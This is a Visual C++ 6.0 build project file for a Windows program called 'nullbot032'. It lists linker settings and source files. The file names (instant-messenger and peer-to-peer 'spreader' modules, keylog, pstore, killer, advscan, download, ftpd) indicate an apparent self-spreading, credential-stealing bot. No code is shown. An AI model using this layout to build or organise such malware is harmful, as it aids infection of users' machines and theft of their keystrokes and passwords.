# Microsoft Developer Studio Project File - Name="nullbot032" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=nullbot032 - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "nullbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "nullbot.mak" CFG="nullbot032 - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "nullbot032 - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib mpr.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /out:"bin/nullbot032.exe" /align:4096
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "nullbot032 - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "spreader files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Aim.cpp
# End Source File
# Begin Source File

SOURCE=.\Gaim.cpp
# End Source File
# Begin Source File

SOURCE=.\GoogleTalk.cpp
# End Source File
# Begin Source File

SOURCE=.\Icq.cpp
# End Source File
# Begin Source File

SOURCE=.\IMSpread.cpp
# End Source File
# Begin Source File

SOURCE=.\Msn.cpp
# End Source File
# Begin Source File

SOURCE=.\PalTalk.cpp
# End Source File
# Begin Source File

SOURCE=.\Peer2Peer.cpp
# End Source File
# Begin Source File

SOURCE=.\Skype.cpp
# End Source File
# Begin Source File

SOURCE=.\Symnatec.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\hostcheck.cpp
# End Source File
# Begin Source File

SOURCE=.\keylog.cpp
# End Source File
# Begin Source File

SOURCE=.\killer.cpp
# End Source File
# Begin Source File

SOURCE=.\nullbot.cpp
# End Source File
# Begin Source File

SOURCE=.\other.cpp
# End Source File
# Begin Source File

SOURCE=.\pstore.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\uninstall.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter ""
# Begin Group "spreader headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Aim.h
# End Source File
# Begin Source File

SOURCE=.\Gaim.h
# End Source File
# Begin Source File

SOURCE=.\GoogleTalk.h
# End Source File
# Begin Source File

SOURCE=.\IMSpread.h
# End Source File
# Begin Source File

SOURCE=.\Msn.h
# End Source File
# Begin Source File

SOURCE=.\PalTalk.h
# End Source File
# Begin Source File

SOURCE=.\Peer2Peer.h
# End Source File
# Begin Source File

SOURCE=.\Skype.h
# End Source File
# Begin Source File

SOURCE=.\symnatec.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\extern.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\hostcheck.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\nullbot.h
# End Source File
# Begin Source File

SOURCE=.\other.h
# End Source File
# Begin Source File

SOURCE=.\pstore.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\uninstall.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\config.h
# End Source File
# End Target
# End Project
